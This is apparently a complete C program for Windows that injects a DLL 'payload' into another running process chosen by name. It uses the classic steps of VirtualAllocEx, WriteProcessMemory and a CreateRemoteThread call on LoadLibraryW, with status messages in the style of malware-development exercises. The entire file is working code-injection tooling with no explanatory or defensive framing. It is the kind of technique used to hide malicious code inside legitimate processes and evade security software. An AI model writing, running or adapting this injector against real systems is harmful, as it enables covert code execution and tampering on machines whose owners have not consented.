#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

#include <windows.h>
#include <stdio.h>

BOOL AllocateMemoryInProcess(HANDLE hProcess, LPVOID* pAddress, DWORD dwSizeToWrite);
BOOL WriteMemoryInProcess(HANDLE hProcess, LPVOID pAddress, LPWSTR DllName, DWORD dwSizeToWrite, SIZE_T* lpNumberOfBytesWritten);
BOOL CreateRemoteThreadInProcess(HANDLE hProcess, LPVOID pLoadLibraryW, LPVOID pAddress, HANDLE* hThread);

BOOL InjectDllToRemoteProcess(HANDLE hProcess, LPWSTR DllName) {
    BOOL bSTATE = TRUE;

    LPVOID pLoadLibraryW = NULL;
    LPVOID pAddress = NULL;

    DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
    SIZE_T lpNumberOfBytesWritten = NULL;
    HANDLE hThread = NULL;

    pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto EndOfFunction;
    }

    if (!AllocateMemoryInProcess(hProcess, &pAddress, dwSizeToWrite)) {
        bSTATE = FALSE; goto EndOfFunction;
    }

    if (!WriteMemoryInProcess(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten)) {
        bSTATE = FALSE; goto EndOfFunction;
    }

    if (!CreateRemoteThreadInProcess(hProcess, pLoadLibraryW, pAddress, &hThread)) {
        bSTATE = FALSE; goto EndOfFunction;
    }

    printf("[+] DONE !\n");

EndOfFunction:
    if (hThread)
        CloseHandle(hThread);
    return bSTATE;
}

BOOL AllocateMemoryInProcess(HANDLE hProcess, LPVOID* pAddress, DWORD dwSizeToWrite) {
    *pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*pAddress == NULL) {
        printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", *pAddress, dwSizeToWrite);
    return TRUE;
}

BOOL WriteMemoryInProcess(HANDLE hProcess, LPVOID pAddress, LPWSTR DllName, DWORD dwSizeToWrite, SIZE_T* lpNumberOfBytesWritten) {
    if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, lpNumberOfBytesWritten) || *lpNumberOfBytesWritten != dwSizeToWrite) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Successfully Written %d Bytes\n", *lpNumberOfBytesWritten);
    return TRUE;
}

BOOL CreateRemoteThreadInProcess(HANDLE hProcess, LPVOID pLoadLibraryW, LPVOID pAddress, HANDLE* hThread) {
    *hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
    if (*hThread == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL GetProcessSnapshot(HANDLE* hSnapShot);
BOOL GetFirstProcessInSnapshot(HANDLE hSnapShot, PROCESSENTRY32* Proc);
BOOL GetProcessHandleAndID(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE hSnapShot, PROCESSENTRY32 Proc);
void ToLowerW(WCHAR* dest, const WCHAR* src, size_t size);

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
    HANDLE hSnapShot = NULL;
    PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };

    if (!GetProcessSnapshot(&hSnapShot)) goto EndOfFunction;
    if (!GetFirstProcessInSnapshot(hSnapShot, &Proc)) goto EndOfFunction;
    if (!GetProcessHandleAndID(szProcessName, dwProcessId, hProcess, hSnapShot, Proc)) goto EndOfFunction;

    CloseHandle(hSnapShot);
    return TRUE;

EndOfFunction:
    if (hSnapShot != NULL) CloseHandle(hSnapShot);
    return FALSE;
}

BOOL GetProcessSnapshot(HANDLE* hSnapShot) {
    *hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (*hSnapShot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL GetFirstProcessInSnapshot(HANDLE hSnapShot, PROCESSENTRY32* Proc) {
    if (!Process32First(hSnapShot, Proc)) {
        printf("[!] Process32First Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL GetProcessHandleAndID(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE hSnapShot, PROCESSENTRY32 Proc) {
    WCHAR LowerName[MAX_PATH * 2];
    do {
        if (Proc.szExeFile) {
            ToLowerW(LowerName, Proc.szExeFile, MAX_PATH * 2);
            if (wcscmp(LowerName, szProcessName) == 0) {
                *dwProcessId = Proc.th32ProcessID;
                *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
                if (*hProcess == NULL) {
                    printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
                    return FALSE;
                }
                return TRUE;
            }
        }
    } while (Process32Next(hSnapShot, &Proc));
    return FALSE;
}

void ToLowerW(WCHAR* dest, const WCHAR* src, size_t size) {
    size_t len = wcslen(src);
    size = min(size - 1, len);
    for (size_t i = 0; i < size; ++i) {
        dest[i] = towlower(src[i]);
    }
    dest[size] = L'\0';
}

int wmain(int argc, wchar_t* argv[]) {

    if (argc < 3) {
        wprintf(L"[!] Usage: \"%s\" <Complete Dll Payload Path> <Process Name>\n", argv[0]);
        return -1;
    }

    HANDLE hProcess = NULL;
    DWORD dwProcessId = NULL;

    wprintf(L"[i] Searching for process ID of \"%s\"... ", argv[2]);
    if (!GetRemoteProcessHandle(argv[2], &dwProcessId, &hProcess)) {
        wprintf(L"[!] Process \"%s\" not found.\n", argv[2]);
        return -1;
    }
    wprintf(L"[+] Done. Found target process PID: %d\n", dwProcessId);

    wprintf(L"[i] Injecting the DLL...\n");
    if (!InjectDllToRemoteProcess(hProcess, argv[1])) {
        wprintf(L"[!] Failed to inject DLL \"%s\" into process \"%s\".\n", argv[1], argv[2]);
        CloseHandle(hProcess);
        return -1;
    }
    wprintf(L"[+] DLL injected successfully.\n");

    CloseHandle(hProcess);
    wprintf(L"[#] Press <Enter> to quit...");
    getchar();
    return 0;
}
